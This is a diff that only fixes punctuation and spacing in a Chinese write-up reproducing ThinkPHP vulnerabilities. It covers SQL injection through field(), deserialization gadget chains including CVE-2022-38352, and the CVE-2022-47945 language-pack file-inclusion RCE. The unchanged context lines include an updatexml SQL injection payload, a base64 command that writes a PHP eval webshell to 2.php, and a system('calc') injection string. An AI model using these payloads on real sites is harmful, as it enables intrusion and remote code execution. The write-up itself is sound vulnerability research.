@@ -32,7 +32,7 @@ ThinkPHP < 5.1.23
 ```plain
 git clone https://github.com/top-think/think.git
 git checkout v5.1.22
-修改composer.json的topthink/framework值为5.1.22
+修改 composer.json 的 topthink/framework 值为 5.1.22
 composer install
 ```
 
@@ -50,7 +50,7 @@ class Index
     public function index()
     {
         echo "index";
-        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V5.1<br/><span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
+        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V5.1<br/><span style="font-size:30px">12 载初心不改（2006-2018） - 你值得信赖的 PHP 框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
     }
 
     public function hello($name = 'ThinkPHP5')
@@ -90,7 +90,7 @@ ORDER BY field(id,111)|updatexml(1,concat(0x3a,user()),1)#,:data**id,111)|update
 
 [![](assets/1710900891-099fb4024496a9a9718cb2034452a77e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240304110227-a1d4aa96-d9d3-1.png)
 
-这里由于 field 函数，漏洞利用有两个关键点:
+这里由于 field 函数，漏洞利用有两个关键点：
 
 1.  field () 函数必须指定大于等于两个字段才可以正常运行，否则就会报错，当表中只有一个字段时，我们可以随意指定一个数字或字符串的参数
 2.  当 field 中的参数不是字符串或数字时，指定的参数必须是正确的表字段，否则程序就会报错。这里由于程序会在第一个字段中加 限制，所以必须指定正确的字段名称。第二个字段没有限制，可以指定字符串或数字
@@ -99,7 +99,7 @@ ORDER BY field(id,111)|updatexml(1,concat(0x3a,user()),1)#,:data**id,111)|update
 
 ThinkPHP v6.0.8 通过组件 vendor\\league\\flysystem-cached-adapter\\src\\Storage\\Adapter.php 发现一个反序列化漏洞。
 
-### 范围:
+### 范围：
 
 thinkphp<6.0.9
 
@@ -208,7 +208,7 @@ namespace {
 
 ThinkPHP v6.0.8 通过组件 vendor\\league\\flysystem-cached-adapter\\src\\Storage\\Adapter.php 发现一个反序列化漏洞。
 
-### 范围:
+### 范围：
 
 thinkphp<6.0.9
 
@@ -311,7 +311,7 @@ ThinkPHP v6.0.8 已通过组件 League\\Flysystem\\Cached\\Storage\\AbstractCach
 
 ### 范围
 
-thinkphp<=6.0.8,Linux 系统，因为核心是把 system (json 加密的数据), 类似:  
+thinkphp<=6.0.8,Linux 系统，因为核心是把 system (json 加密的数据), 类似： 
 \[\["`whoami`"\],\[\]\]  
 这样的结果返回，Windows 肯定不会执行成功，Linux 可以返回，虽然没有回显但是命令执行函数已经执行了。所以我们可以写木马文件  
 \[\[jmx\],\[\]\]: command not found
@@ -384,7 +384,7 @@ public function __destruct()
 }
 ```
 
-think\\filesystem 的 CacheStore.php 的 save () 方法:getForStorage () 方法调试多了都有经验了，这里设置的 cache 是一维数组会直接返回 cache 的值:  
+think\\filesystem 的 CacheStore.php 的 save () 方法:getForStorage () 方法调试多了都有经验了，这里设置的 cache 是一维数组会直接返回 cache 的值： 
 \['`echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d > 2.php`'\]  
 最后返回 json\_encode 函数处理后的结果  
 \[\["`echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+|base64 -d > 2.php`"\],\[\]\]  
@@ -485,10 +485,10 @@ namespace{
 
 入口点在 think\\Model\\ 的 **destruct () 方法进入 save () 方法进入 insertData () 方法进入 checkAllowFields () 方法进入 db () 方法执行 $query->table ($this->table . $this->suffix); 语句此时开始进入链子了，拼接对象和字符串造成 toString 魔术方法调用，think\\route 的 Url.phpif 语句一直进不去，最后跑到  
 $bind = $this->route->getDomainBind($domain && is\_string($domain) ? $domain : null);  
-然后进入 getDomainBind () 方法，这里设置了 domain 的值，直接进入了 Output.php 的** call () 方法: call\_user\_func\_array (\[$this, 'block'\], $args);  
+然后进入 getDomainBind () 方法，这里设置了 domain 的值，直接进入了 Output.php 的** call () 方法：call\_user\_func\_array (\[$this, 'block'\], $args);  
 Output.php 的 block () 方法 ->writeln () 方法  
 $this->writeln("<{$style}>{$message}</$style>");  
-Output.php 的 writeln () 方法 ->write () 方法:  
+Output.php 的 writeln () 方法 ->write () 方法： 
 $this->write($messages, true, $type);  
 此时 message 为 <getdomainbind>write () 方法  
 $this->handle->write($messages, $newline, $type);  
@@ -505,9 +505,9 @@ $this->filesystem 被设置的 think\\session\\driver\\File, 调用它的 write 
 
 ## CVE-2022-38352
 
-### 影响版本: Thinkphp <= v6.0.13
+### 影响版本：Thinkphp <= v6.0.13
 
-### 介绍:
+### 介绍：
 
 攻击者可以通过组件 League\\Flysystem\\Cached\\Storage\\Psr6Cache 包含反序列化漏洞，目前的 Thinkphp6.1.0 以上已经将 filesystem 移除了 因为此处存在好多条反序列化漏洞  
 安装和前一篇文章一样，这里为了方便就用上一篇文章的 6.0.12 了
@@ -588,7 +588,7 @@ namespace{
 
 ### 分析
 
-在 Index.php 添加反序列化点:
+在 Index.php 添加反序列化点：
 
 ```plain
 <?php
@@ -612,7 +612,7 @@ class Index extends BaseController
 }
 ```
 
-在 unserialize 打断点，进入调试首先是 Psr6Cache.php 的父类的 AbstractCache.php 的\_\_destruct () 方法:
+在 unserialize 打断点，进入调试首先是 Psr6Cache.php 的父类的 AbstractCache.php 的\_\_destruct () 方法：
 
 ```plain
 public function __destruct()
@@ -639,7 +639,7 @@ public function __destruct()
 
 [![](assets/1710900891-10e59a8738931397089e821384a47905.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240304110442-f2b46f32-d9d3-1.png)
 
-跟进 getAlias () 方法:
+跟进 getAlias () 方法：
 
 [![](assets/1710900891-95a5c65b111dc1a00e25936cda3432ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240304110451-f79a5e9e-d9d3-1.png)
 
@@ -649,11 +649,11 @@ return isset($this->instances\[$abstract\])
 
 [![](assets/1710900891-356554ff7830ce995bc0d7c6a38c27f0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240304110511-0389e5f8-d9d4-1.png)
 
-调用 domain 方法:
+调用 domain 方法：
 
 [![](assets/1710900891-4b005bf97fb06dcd0eca13491328c73f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240304110524-0b61eda2-d9d4-1.png)
 
-最后返回 http://<?php system ('calc'); exit (); ?>$currentUri 变量的值为 http://<?php system ('calc'); exit (); ?> 而后判断 config \['format\_head'\], 执行 invoke 函数这里设置的 config \['format\_head'\] 为数组: \[new \\think\\view\\driver\\Php,'display'\] App.php 没有 invoke 方法，调用父类 Container.php 的:
+最后返回 http://<?php system ('calc'); exit (); ?>$currentUri 变量的值为 http://<?php system ('calc'); exit (); ?> 而后判断 config \['format\_head'\], 执行 invoke 函数这里设置的 config \['format\_head'\] 为数组：\[new \\think\\view\\driver\\Php,'display'\] App.php 没有 invoke 方法，调用父类 Container.php 的：
 
 [![](assets/1710900891-1043da2f12f453d8f86b81b2f43fc62b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240304110539-14302e12-d9d4-1.png)
 
@@ -697,7 +697,7 @@ $this->setAttrs($data);
 ['r' =>  
     ["n" => $value]  
 ]
-value是一个think\route\Url类型的对象
+value 是一个 think\route\Url 类型的对象
 ```
 
 调用到 $model = $this->getRelation ($name, true); 我们控制 $this->relation = \['r' => $this\];,$this 为本 Pivot 对象然后可以进入 if 语句调用 $model->exists (true)->save ($val);, 此时 $val 是被键值对分出的值，一维数组 \["n" => $value\]  
@@ -708,7 +708,7 @@ $this->route 被设置为 think\\log\\Channel 对象，调用它的** call->log 
 ```plain
 protected $serialize = ["call_user_func"];
 $this->data = [$data, "param"];
-$data是think\Request()实例
+$data 是 think\Request() 实例
 ```
 
 调用的 call\_user\_func ($this->data) 去了 Request 的 param () 函数  
@@ -832,7 +832,7 @@ namespace {
 
 ## CVE-2022-47945
 
-### 影响范围:
+### 影响范围：
 
 thinkphp<=6.0.13
 
@@ -840,14 +840,14 @@ thinkphp<=6.0.13
 
 如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越 + 文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。
 
-### 复现:
+### 复现：
 
 #### thinkphp6.0.12
 
 ##### 安装
 
 composer create-project topthink/think=6.0.12 tp6  
-注意由于 composer 在安装时一些依赖的更新导致此时的 tp6 不是 6.0.12 而是 6.1.4, 因此我们需要手动修改 composer.json 的 require 的内容:
+注意由于 composer 在安装时一些依赖的更新导致此时的 tp6 不是 6.0.12 而是 6.1.4, 因此我们需要手动修改 composer.json 的 require 的内容：
 
 ```plain
 "require": {
@@ -871,7 +871,7 @@ return [
     // \think\middleware\CheckRequestCache::class,
     // 多语言加载
     \think\middleware\LoadLangPack::class,
-    // Session初始化
+    // Session 初始化
     // \think\middleware\SessionInit::class
 ];
 ```
